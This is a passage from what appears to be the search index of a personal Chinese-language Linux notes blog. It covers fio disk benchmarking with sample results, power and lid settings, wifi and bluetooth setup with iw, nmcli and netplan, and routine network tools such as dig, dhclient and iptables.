O_ATOMIC</li> <li>readwrite=str, rw=str<ul> <li>read: Sequential reads.</li> <li>write: Sequential writes.</li> <li>randread: Random reads.</li> <li>randwrite: Random writes.</li> <li>rw,readwrite: Sequential mixed reads and writes</li> <li>randrw: Random mixed reads and writes.</li> <li>trim, randtrim, trimwrite</li> </ul> </li> <li>Block size</li> <li>bs: The block size in bytes used for I/O units</li> <li>Buffer and Memory</li> <li>sync=str<ul> <li>sync: Use synchronous file IO. O_SYNC</li> <li>dsync: Use synchronous data IO. For the majority of I/O engines, this means using O_DSYNC.</li> </ul> </li> <li>I/O size</li> <li>size: The total size of file I/O for each thread of this job. Fio will run until this many bytes has been transferred, unless runtime is limited by  other  options  (such  as  runtime, for instance, or increased/decreased by io_size).</li> <li>I/O engine</li> <li>ioengine=str<ul> <li>psync: Basic pread(2) or pwrite(2) I/O. Default on all supported operating systems except for Windows</li> <li>libaio:  Linux native asynchronous I/O. Note that Linux may only support queued behavior with non-buffered  I/O  (set  direct=1 or buffer=0).  This engine defines engine specific options.</li> </ul> </li> <li>I/O depth</li> <li>iodepth=int<ul> <li>Number of I/O units to keep in flight against the file. Note that increasing iodepth beyond 1 will not affect synchronous  ioengines  (except  for  small  degrees  when verify_async is in use). Even async engines may impose OS restrictions causing the desired depth not to be achieved. This may happen on Linux when using libaio and not setting <code>direct=1</code>', since buffered I/O is not async on that OS. Keep  an  eyeon the I/O depth distribution in the fio output to verify that the achieved depth is as expected. Default: 1.</li> </ul> </li> </ul> <p>stonewall wait_for_previous  Wait for preceding jobs in the job file to exit, before starting this one. Can be used to insert serialization points in the job  file.  A stone  wall  also  implies  starting  a  new  reporting  group,  see  group_reporting.  Optionally you can use <code>stonewall=0</code> to disable or <code>stonewall=1</code> to enable it.</p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u914d\u7f6e\u6587\u4ef6_1","title":"\u914d\u7f6e\u6587\u4ef6","text":"<ul> <li>global\u516c\u5171\u90e8\u5206\uff0c\u5f71\u54cd\u540e\u9762\u6bcf\u4e00\u4e2ajob</li> <li>stonewall\u7b49\u5f85\u524d\u9762\u4e00\u4e2a\u5b8c\u6210</li> <li>filename\u6307\u5b9a\u5171\u540c\u4f7f\u7528\u4e00\u4e2a\u6587\u4ef6\uff08\u5426\u5219\u4f1a\u6839\u636ejob\u540d\u81ea\u52a8\u751f\u6210\uff09 <pre><code>sudo fio --directory=/root/ --filename=test.bin ssd-win-likely.fio\n\nvim ssd-win-likely.fio #\u6a21\u4effwindows\u4e0bdiskmark\uff0c\u6d4b\u987a\u5e8f\u8bfb\u5199\u548c4k\u968f\u673a\n[global]\nioengine=libaio\nsize=10g\ndirect=1\nruntime=60\n\n[seq-read-4m]\nbs=4M\niodepth=32\nrw=read\nstonewall\n\n[seq-write-4m]\nbs=4M\niodepth=32\nrw=write\nstonewall\n\n[rand-read-4k]\nbs=4k\niodepth=4\nrw=randread\nstonewall\n\n[rand-write-4k]\nbs=4k\niodepth=4\nrw=randwrite\nstonewall\n</code></pre></li> </ul>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u4f8b\u5b50","title":"\u4f8b\u5b50","text":"<p>aigo P7000Z 2TB pcie 4.0 (\u6807\u79f0\u8bfb7350, \u51996750 MB/s) - \u4f7f\u7528\u4e0a\u8ff0\u914d\u7f6e\u6587\u4ef6\u6d4b\u5f97\u53ea\u67093231, 330, 5999, 509MB/s\uff0c\u6000\u7591\u662f\u8fde\u7eed\u6d4b\u8bd5\u5bfc\u81f4\u8fc7\u70ed\u964d\u901f\u3002 - \u5355\u72ec\u6d4b\u8bd5\u6d4b\u5f97\uff1a\u987a\u5e8f\u8bfb7319MB/s\uff0c\u987a\u5e8f\u51996620MB/s\uff084M, direct, QD=32, libaio\uff09</p> <pre><code>sudo fio --filename=fio.img --bs=4M --direct=1 --iodepth=32 --size=10g --runtime=60 --rw=read --name=seq-read --ioengine=libaio\n</code></pre> <p>\u8f93\u51fa <pre><code>seq-read: (g=0): rw=read, bs=(R) 4096KiB-4096KiB, (W) 4096KiB-4096KiB, (T) 4096KiB-4096KiB, ioengine=libaio, iodepth=32\nfio-3.28\nStarting 1 process\nJobs: 1 (f=1)\nseq-read: (groupid=0, jobs=1): err= 0: pid=207476: Sun Apr  2 22:26:36 2023\n  read: IOPS=1745, BW=6980MiB/s (7319MB/s)(10.0GiB/1467msec)\n    slat (usec): min=66, max=988, avg=118.46, stdev=69.15\n    clat (usec): min=4051, max=35006, avg=18079.05, stdev=1613.53\n     lat (usec): min=4574, max=35099, avg=18197.64, stdev=1588.77\n    clat percentiles (usec):\n     |  1.00th=[11076],  5.00th=[17957], 10.00th=[17957], 20.00th=[17957],\n     | 30.00th=[17957], 40.00th=[17957], 50.00th=[18220], 60.00th=[18220],\n     | 70.00th=[18220], 80.00th=[18220], 90.00th=[18220], 95.00th=[18482],\n     | 99.00th=[20579], 99.50th=[28181], 99.90th=[33817], 99.95th=[34341],\n     | 99.99th=[34866]\n   bw (  MiB/s): min= 6912, max= 7024, per=99.82%, avg=6968.00, stdev=79.20, samples=2\n   iops        : min= 1728, max= 1756, avg=1742.00, stdev=19.80, samples=2\n  lat (msec)   : 10=0.90%, 20=98.01%, 50=1.09%\n  cpu          : usr=0.00%, sys=22.10%, ctx=2530, majf=0, minf=32782\n  IO depths    : 1=0.1%, 2=0.1%, 4=0.2%, 8=0.3%, 16=0.6%, 32=98.8%, &gt;=64=0.0%\n     submit    : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     complete  : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.1%, 64=0.0%, &gt;=64=0.0%\n     issued rwts: total=2560,0,0,0 short=0,0,0,0 dropped=0,0,0,0\n     latency   : target=0, window=0, percentile=100.00%, depth=32\n</code></pre></p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u7ed3\u679c","title":"\u7ed3\u679c","text":"<ul> <li>\u897f\u6570\u7d2b\u76d8 2TB\uff1a </li> <li>read: IOPS=47, BW=192MiB/s (201MB/s)(4096MiB/21381msec)</li> <li>write: IOPS=47, BW=188MiB/s (197MB/s)(4096MiB/21768msec); 0 zone resets</li> <li>\u5e0c\u6377\u9177\u9c7c 4TB\uff1a</li> <li>read: IOPS=35, BW=142MiB/s (149MB/s)(4096MiB/28785msec)</li> <li>write: IOPS=34, BW=138MiB/s (144MB/s)(4096MiB/29777msec); 0 zone resets</li> <li>btrfs\u6df7\u5408(\u897f\u6570\u7d2b\u76d8 2TB+\u5e0c\u6377\u9177\u9c7c 2/4TB)</li> <li>read: IOPS=45, BW=182MiB/s (190MB/s)(4096MiB/22564msec)</li> <li> <p>write: IOPS=39, BW=160MiB/s (167MB/s)(4096MiB/25644msec); 0 zone resets</p> </li> <li> <p>aigo 4.0</p> </li> <li>read: IOPS=83.7k, BW=327MiB/s (343MB/s)(10.0GiB/31321msec) 4k rand q=4</li> <li>write: IOPS=125k, BW=487MiB/s (511MB/s)(10.0GiB/21008msec);</li> <li>btrfs\u6df7\u5408\uff084.0 + 3.0\uff09</li> <li>read: IOPS=540, BW=2163MiB/s (2268MB/s)(10.0GiB/4734msec) 4M seq q=32</li> <li>read: IOPS=76.5k, BW=299MiB/s (313MB/s)(10.0GiB/34280msec) 4k rand q=4</li> <li>write: IOPS=77.4k, BW=302MiB/s (317MB/s)(10.0GiB/33876msec) 4k rand q=4</li> </ul>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u751f\u6d3b\u76f8\u5173","title":"\u751f\u6d3b\u76f8\u5173","text":"","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u7981\u6b62\u4f11\u7720","title":"\u7981\u6b62\u4f11\u7720","text":"<p>How to Disable Suspend and Hibernation Modes In Linux (tecmint.com) <pre><code>sudo systemctl status sleep.target suspend.target hibernate.target hybrid-sleep.target\n</code></pre></p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u7981\u6b62\u5173\u95ed\u7b14\u8bb0\u672c\u76d6\u5b50\u4f11\u7720","title":"\u7981\u6b62\u5173\u95ed\u7b14\u8bb0\u672c\u76d6\u5b50\u4f11\u7720","text":"<pre><code>vim /etc/systemd/logind.conf\n\nHandleLidSwitch=lock   # \u4ecesuspend\u6539\u4e3alock\n</code></pre> <p>man logind.conf</p> <p>Controls how logind shall handle the system power, reboot and sleep keys and the lid switch to trigger actions such as system power-off, reboot or suspend. Can be one of \"ignore\", \"poweroff\", \"reboot\", \"halt\", \"kexec\", \"suspend\", \"hibernate\", \"hybrid-sleep\", \"suspend-then-hibernate\", \"lock\", and \"factory-reset\". </p> <p>If \"ignore\", systemd-logind will never handle these keys. If \"lock\", all running sessions will be screen-locked; otherwise, the specified action will be taken in the respective event. Only input devices with the \"power-switch\" udev tag will be watched for key/lid switch events. </p> <p>HandlePowerKey= defaults to \"poweroff\", HandleRebootKey= defaults to \"reboot\", HandleSuspendKey= defaults to \"suspend\", HandleHibernateKey= defaults to \"hibernate\", HandlePowerKeyLongPress= defaults to \"ignore\", HandleRebootKeyLongPress= defaults to \"poweroff\", HandleSuspendKeyLongPress= defaults to \"hibernate\", HandleHibernateKeyLongPress= defaults to \"ignore\".  HandleLidSwitch= defaults to \"suspend\".  HandleLidSwitchExternalPower= is completely ignored by default (for backwards compatibility) \u2014 an explicit value must be set before it will be used to determine behaviour.  HandleLidSwitchDocked= defaults to \"ignore\". If the system is inserted in a docking station, or if more than one display is connected, the action specified by HandleLidSwitchDocked= occurs; if the system is on external power the action (if any) specified by HandleLidSwitchExternalPower= occurs; otherwise the HandleLidSwitch= action occurs.</p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u8fde\u63a5wifi","title":"\u8fde\u63a5wifi","text":"","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#iwiwconfig\u7b49\u5e95\u5c42\u5de5\u5177","title":"iw,iwconfig\u7b49\u5e95\u5c42\u5de5\u5177","text":"<ul> <li>iw</li> <li>iwlist</li> <li>wpa_supplicant: \u7528\u4e8e\u8fde\u63a5WPA\u52a0\u5bc6\u7684wifi</li> </ul> <p>\u4e0d\u4f7f\u7528networkmanger\u7b49\u5de5\u5177\uff0c\u9700\u8981 - iw\u8fde\u63a5wifi   - ifup interface - \u5f00\u542fdhcpclient\u83b7\u5f97ip</p> <p>Network configuration/Wireless - ArchWiki (archlinux.org)</p> <pre><code>\u2588\u2593\u2592\u2591root@king3399\u2588\u2593\u2592\u2591 Mon Aug 07 03:07:46pm\n~/ iw dev wlan0 station dump\nStation 3c:cd:57:f5:da:85 (on wlan0)\n        inactive time:  0 ms\n        rx bytes:       26025\n        rx packets:     153\n        tx bytes:       22842\n        tx packets:     121\n        tx failed:      0\n        signal:         -63 dBm\n        tx bitrate:     234.0 MBit/s\n        rx bitrate:     390.0 MBit/s\n        authorized:     yes\n        authenticated:  yes\n        associated:     yes\n        WMM/WME:        yes\n        TDLS peer:      no\n        DTIM period:    1\n        beacon interval:100\n        short slot time:yes\n        connected time: 60 seconds\n        current time:   1691392108815 ms\n\u2588\u2593\u2592\u2591root@king3399\u2588\u2593\u2592\u2591 Mon Aug 07 03:08:28pm\n~/ iw dev wlan0 link\nConnected to 3c:cd:57:f5:da:85 (on wlan0)\n        SSID: ACSA-706-5G\n        freq: 5240\n        RX: 29153 bytes (171 packets)\n        TX: 24932 bytes (142 packets)\n        signal: -60 dBm\n        rx bitrate: 390.0 MBit/s\n        tx bitrate: 234.0 MBit/s\n\n        bss flags:      short-slot-time\n        dtim period:    1\n        beacon int:     100\n</code></pre> <p>\u626b\u63cfwifi <pre><code>iwlist wlan0 scan |grep ESSID    # \u5217\u51fawifi\n</code></pre></p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#networkmanger","title":"NetworkManger","text":"<p>GUI\uff1a\u57fa\u4e8eGTK\u7684nm-connection-editor CLI\uff1a - nmtui\uff1a\u4f7f\u7528\u8d77\u6765\u5f88\u7b80\u5355\uff0c\u53ef\u4ee5\u7f16\u8f91\u6709\u7ebf\u65e0\u7ebf\u914d\u7f6e\uff0c\u6fc0\u6d3b\u8fde\u63a5\u7b49\u3002 - nmcli\uff1a\u66f4\u52a0\u5e95\u5c42\u7684\u547d\u4ee4\u884c\uff0c\u529f\u80fd\u8fd8\u662f\u5f88\u5f3a\u5927\u7684</p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#nmcli\u57fa\u672c\u4f7f\u7528","title":"nmcli\u57fa\u672c\u4f7f\u7528","text":"<pre><code>nmcli conn\nnmcli conn edit xxx\n</code></pre>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#wpa2-enterprise\u8fde\u63a5\u914d\u7f6eeduroam","title":"WPA2 Enterprise\u8fde\u63a5\u914d\u7f6e\uff08eduroam\uff09","text":"<p>WPA2 Enterprise\u5bfc\u81f4\u7684wifi\u65e0\u6cd5\u8fde\u63a5\u95ee\u9898(7) Cannot Connect to College WIFI using NetworkManager : archlinux (reddit.com) <pre><code>Failed to determine AP security information\n</code></pre></p> <p>12.10 - Connect to a WPA2-Enterprise Connection via CLI (no desktop) - Ask Ubuntu</p> <pre><code>nmcli con add type wifi ifname wlan0 con-name eduroam ssid eduroam \n\nYou may edit the following settings: connection, 802-11-wireless (wifi), 802-11-wireless-security (wifi-sec), 802-1x, ethtool, match, ipv4, ipv6, hostname, tc, proxy\nnmcli&gt; set 802-1x.eap peap\nnmcli&gt; set 802-1x.phase2-auth mschapv2\nnmcli&gt; set 802-1x.identity xxxxx\nnmcli&gt; set 802-1x.password xxxxx\nnmcli&gt; set wifi-sec.key-mgmt wpa-eap\nnmcli&gt; save\nConnection 'eduroam' (ae79dc6c-b660-469d-9ecb-3a29504de969) successfully updated.\nnmcli&gt; activate\n</code></pre>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#netplan\u8fde\u63a5wifi\u914d\u7f6e","title":"netplan\u8fde\u63a5wifi\u914d\u7f6e","text":"<p>How to configure wifi in Ubuntu (linuxhint.com) <pre><code># netplan yaml\nnetwork:\n  version: 2\n  renderer: networkd\n  wifis:\n      wlan0:\n        optional: true\n        dhcp4: true\n        dhcp6: true\n        access-points:\n          \"ustcnet\": {}   # \u6ca1\u6709\u5bc6\u7801\n          \"ssid2\":\n            password: \"aaa\"\n</code></pre></p> <p>\u901a\u8fc7iwconfig\u67e5\u770b\u662f\u5426\u8fde\u63a5\u6210\u529f\uff0c\u51fa\u73b0ESSID\u5219\u4e3a\u6210\u529f <pre><code>\u279c  ~ iwconfig wlan0\nwlan0     IEEE 802.11  ESSID:\"P2W_5G\"\n          Mode:Managed  Frequency:5.745 GHz  Access Point: 1C:40:E8:11:89:CF\n          Bit Rate=234 Mb/s   Tx-Power=22 dBm\n          Retry short limit:7   RTS thr:off   Fragment thr:off\n          Power Management:on\n          Link Quality=70/70  Signal level=-35 dBm\n          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0\n          Tx excessive retries:0  Invalid misc:7   Missed beacon:0\n</code></pre></p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u97f3\u4e50","title":"\u97f3\u4e50","text":"<p>USB Bluetooth passthrough KVM : VFIO (reddit.com) The 5 Best Command Line Music Players for Linux (tecmint.com) <pre><code>sudo apt install cmus\ncmus\n\n5 # \u6d4f\u89c8\u5f53\u524d\u6587\u4ef6\u5939\n</code></pre></p> <p>\u4f7f\u7528vlc <pre><code>cvlc file.mp3\n</code></pre></p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u84dd\u7259","title":"\u84dd\u7259","text":"<p>Bluetooth - ArchWiki (archlinux.org)</p> <p>\u547d\u4ee4\u884c\u5de5\u5177<code>bluetoothctl</code></p> <ol> <li>(optional) Select a default controller with\u00a0<code>select\u00a0_MAC_address_</code>.</li> <li>(optional) Enter\u00a0<code>power on</code>\u00a0to turn the power to the controller on if the device is set to off. It is on by default; see\u00a0#Default adapter power state.</li> <li>Enter\u00a0<code>devices</code>\u00a0to get the MAC address of the device with which to pair.</li> <li>Enter device discovery mode with\u00a0<code>scan on</code>\u00a0command if device is not yet on the list.</li> <li>Turn the agent on with\u00a0<code>agent on</code>\u00a0or choose a specific agent: if you press tab twice after\u00a0<code>agent</code>\u00a0you should see a list of available agents. A bluetooth agent is what manages the Bluetooth 'pairing code'. It can either respond to a 'pairing code' coming in, or can send one out. The\u00a0<code>default-agent</code>\u00a0should be appropriate in most cases.[1]</li> <li>Enter\u00a0<code>pair\u00a0_MAC_address_</code>\u00a0to do the pairing (tab completion works).</li> <li>If using a device without a PIN, one may need to manually trust the device before it can reconnect successfully. Enter\u00a0<code>trust\u00a0_MAC_address_</code>\u00a0to do so.</li> <li>Enter\u00a0<code>connect\u00a0_MAC_address_</code>\u00a0to establish a connection.</li> </ol>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u7f51\u7edc","title":"\u7f51\u7edc","text":"","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#network\u76f8\u5173","title":"network\u76f8\u5173","text":"","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u7f51\u7edc\u914d\u7f6e\u65b9\u6cd5","title":"\u7f51\u7edc\u914d\u7f6e\u65b9\u6cd5","text":"<p>NetworkConfiguration - Debian Wiki - ifupdown   - debian\u9ed8\u8ba4\u7684\u65b9\u6cd5   - \u914d\u7f6e\u6587\u4ef6\u4e3a\uff1a<code>/etc/network/interfaces</code>   - ifupdown2\u662f\u65b0\u7248\uff0c\u652f\u6301\u66f4\u52a0\u7075\u6d3b\u7684\u914d\u7f6e - NetworkManger   - \u76ee\u6807\u662f\u5c3d\u53ef\u80fd\u4fdd\u8bc1\u8fde\u63a5\u5230\u7f51\u7edc\u3002\u4f7f\u7528\u81ea\u52a8\u7684\u89c4\u5219\u914d\u7f6e\u7f51\u7edc\uff0c\u6bd4\u5982\u68c0\u6d4b\u5230\u6709\u7ebf\u8bbe\u5907\u5c31\u4f1a\u8fde\u63a5   - \u5e38\u7528\u4e8e\u684c\u9762\u53d1\u884c\u7248 - systemd   - \u76f8\u5173\u7684\u670d\u52a1\uff1asystemd-networkd, systemd-resolved   - \u914d\u7f6e\u6587\u4ef6\u4f4d\u4e8e<code>/etc/system/network</code>\uff0c\u4f7f\u7528\u7c7b\u4f3c\u4e8eini\u683c\u5f0f - netplan   - \u5e38\u89c1\u4e8eubuntu\uff0c\u5e95\u5c42\u53ef\u4ee5\u57fa\u4e8esystemd-networkd\u6216NetworkManager \uff08\u670d\u52a1\u5668\u7248\u548c\u684c\u9762\u7248\uff09   - \u662f\u53e6\u4e00\u5c42\u62bd\u8c61\uff0c\u4f7f\u7528\u81ea\u5df1\u7684\u914d\u7f6e\u6587\u4ef6<code>/etc/netplan/</code>\uff0c\u4f7f\u7528yaml\u683c\u5f0f\u3002</p> <p>networking - How exactly are NetworkManager, networkd, netplan, ifupdown2, and iproute2 interacting? - Unix &amp; Linux Stack Exchange</p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u7f51\u7edc\u5de5\u5177","title":"\u7f51\u7edc\u5de5\u5177","text":"<p>Chapter\u00a05.\u00a0Network setup (debian.org) - iproute2 - iptables - ethtool - mtr - nmap - tcpdump - dnsutils: nslookup, dig</p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#dhcp","title":"dhcp","text":"<p>\u6d4b\u8bd5dhcp\u662f\u5426\u5de5\u4f5c - netplan\uff08\u6216\u8005\u91cd\u542f\u5bb9\u5668\uff09 + tcpdump  + wireshark</p> <ul> <li>-d: debug\u6a21\u5f0f\uff0c\u524d\u53f0\u8fd0\u884c</li> <li>-n: \u4e0d\u8bbe\u7f6e\u63a5\u53e3</li> <li>-s: \u6307\u5b9adhcp server\uff08\u5426\u5219\u662f\u5e7f\u64ad\uff09 <pre><code> dhclient -d -n -w -s 192.168.35.1\n</code></pre></li> </ul>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#dns","title":"dns","text":"","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#dig","title":"dig","text":"<p><pre><code>dig [@server] [-p port] [-t type] [-4] [-6] [+trace] name\n</code></pre> - @ \u6307\u5b9a DNS \u67e5\u8be2\u4f7f\u7528\u7684\u670d\u52a1\u5668\u540d\u79f0\u6216 IP \uff0cIP \u5730\u5740\u53ef\u4ee5\u662f\u7528\u70b9\u5206\u9694\u7684 IPv4 \u5730\u5740\u4e5f\u53ef\u4ee5\u662f\u5192\u53f7\u5206\u9694\u7684 IPv6 \u5730\u5740\u3002\u5f53\u53c2\u6570\u6307\u5b9a\u7684\u503c\u662f\u670d\u52a1\u5668\u7684\u4e3b\u673a\u540d\u65f6\uff0cdig \u547d\u4ee4\u4f1a\u5728\u67e5\u8be2\u8be5\u57df\u540d\u670d\u52a1\u5668\u524d\u5148\u89e3\u6790\u8be5\u4e3b\u673a\u540d\uff1b - -p \u6307\u5b9a DNS \u67e5\u8be2\u4f7f\u7528\u7684\u7aef\u53e3\u53f7\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b DNS \u67e5\u8be2\u4f7f\u7528\u6807\u51c6\u768453\u7aef\u53e3\uff0c\u82e5\u4f7f\u7528\u975e\u7aef\u53e3\u5219\u9700\u8981\u901a\u8fc7 -p \u53c2\u6570\u6307\u5b9a\uff0c\u53ef\u4f7f\u7528\u6b64\u9009\u9879\u6765\u6d4b\u8bd5\u5df2\u914d\u7f6e\u4e3a\u4fa6\u542c\u975e\u6807\u51c6\u7aef\u53e3\u53f7\u4e0a\u7684 DNS \u670d\u52a1\u5668\uff1b - -t \u6307\u5b9a DNS \u67e5\u8be2\u7684\u8bb0\u5f55\u7c7b\u578b\uff0c\u5e38\u7528\u7684\u7c7b\u578b\u5305\u62ec\uff1aA/AAAA/NS/MX/CNAME \u7b49\uff0c\u7f3a\u7701\u67e5\u8be2\u7c7b\u578b\u662f A \uff1b - -4 \u6307\u5b9a dig \u547d\u4ee4\u4ec5\u4f7f\u7528 IPv4 \u67e5\u8be2\u4f20\u8f93\uff1b - -6 \u6307\u5b9a dig \u547d\u4ee4\u4ec5\u4f7f\u7528 IPv6 \u67e5\u8be2\u4f20\u8f93\uff1b - +trace \u8ddf\u8e2a\u4ece\u6839\u540d\u79f0\u670d\u52a1\u5668\u5f00\u59cb\u7684\u8fed\u4ee3\u67e5\u8be2\u8fc7\u7a0b\uff0c\u7f3a\u7701\u60c5\u51b5\u4e0d\u4f7f\u7528\u8ddf\u8e2a\u3002\u542f\u7528\u8ddf\u8e2a\u65f6\uff0cdig \u547d\u4ee4\u4f1a\u6267\u884c\u8fed\u4ee3\u67e5\u8be2\u4ee5\u89e3\u6790\u8981\u67e5\u8be2\u7684\u540d\u79f0\uff0c\u663e\u793a\u6765\u81ea\u7528\u4e8e\u89e3\u6790\u67e5\u8be2\u7684\u6bcf\u4e2a\u670d\u52a1\u5668\u7684\u5e94\u7b54\u3002</p> <p>\u6307\u5b9a\u89e3\u6790\u7c7b\u578b - NS \u8bb0\u5f55\uff1a\u7528\u6765\u6307\u5b9a\u57df\u540d\u7531\u54ea\u4e2a DNS \u670d\u52a1\u5668\u8fdb\u884c\u89e3\u6790\uff1b - CNAME \u8bb0\u5f55\uff1a\u7528\u6765\u5b9a\u4e49\u57df\u540d\u7684\u522b\u540d\uff0c\u65b9\u4fbf\u5b9e\u73b0\u5c06\u591a\u4e2a\u57df\u540d\u89e3\u6790\u5230\u540c\u4e00\u4e2a IP \u5730\u5740\uff1b - A \u8bb0\u5f55\uff1a\u7528\u6765\u6307\u5b9a\u4e3b\u673a\u540d\u5bf9\u5e94\u7684 IPv4 \u5730\u5740\uff1b - AAAA \u8bb0\u5f55\uff1a\u7528\u6765\u6307\u5b9a\u4e3b\u673a\u540d\u5bf9\u5e94\u7684 IPv6 \u5730\u5740\uff1b - MX \u8bb0\u5f55\uff1a\u7528\u6765\u6307\u5b9a\u6536\u4ef6\u4eba\u57df\u540d\u7684\u90ae\u4ef6\u670d\u52a1\u5668\uff0cSMTP \u534f\u8bae\u4f1a\u6839\u636e MX \u8bb0\u5f55\u7684\u503c\u6765\u51b3\u5b9a\u90ae\u4ef6\u7684\u8def\u7531\u8fc7\u7a0b\uff1b - PTR \u8bb0\u5f55\uff1a\u5e38\u7528\u4e8e\u53cd\u5411\u5730\u5740\u89e3\u6790\uff0c\u5c06 IP \u5730\u5740\u89e3\u6790\u5230\u5bf9\u5e94\u7684\u540d\u79f0\uff1b - SOA \u8bb0\u5f55\uff1a\u79f0\u4e3a\u8d77\u59cb\u6388\u6743\u673a\u6784\u8bb0\u5f55\uff0c\u4e0d\u540c\u4e8e NS \u8bb0\u5f55\u7528\u4e8e\u6807\u8bc6\u591a\u53f0\u57df\u540d\u89e3\u6790\u670d\u52a1\u5668\uff0cSOA \u8bb0\u5f55\u7528\u4e8e\u5728\u591a\u53f0 NS \u8bb0\u5f55\u4e2d\u54ea\u4e00\u53f0\u662f\u4e3b DNS \u670d\u52a1\u5668\u3002</p> <p>USTC lug\u52a0\u7fa4\u94fe\u63a5 <pre><code>dig jointele.ustclug.org TXT\n\n;; ANSWER SECTION:\njointele.ustclug.org.   600     IN      TXT     \"(base64) aHR0cHM6Ly90Lm1lLytYOXg1V09qTVpVbGlZVGRs\"\n</code></pre></p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u67e5\u770b\u4e0a\u6e38dns","title":"\u67e5\u770b\u4e0a\u6e38dns","text":"<p>\u6709\u591a\u79cddns\u8bbe\u7f6e\u65b9\u5f0f\uff1a - \u76f4\u63a5\u7f16\u8f91/etc/resolve\u8bbe\u7f6e\u4e0a\u6e38dns - systemd-resolve\u670d\u52a1\uff08\u81ea\u52a8\u8bbe\u7f6edns\uff09</p> <p><pre><code>systemd-resolve --status\n</code></pre> \u4eceubuntu22.04\u5f00\u59cb <pre><code>resolvectl status\n</code></pre></p> <p>systemd-resolve command not found in Ubuntu 22.04 desktop - Ask Ubuntu</p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#iptables","title":"iptables","text":"<p>\u6301\u4e45\u5316 <pre><code>iptables-save &gt; /etc/iptables/rules.v4  # \nip6tables-save &gt; /etc/iptables/rules.v6 \niptables-restore &lt; /etc/iptables/rules.v4\n</code></pre> 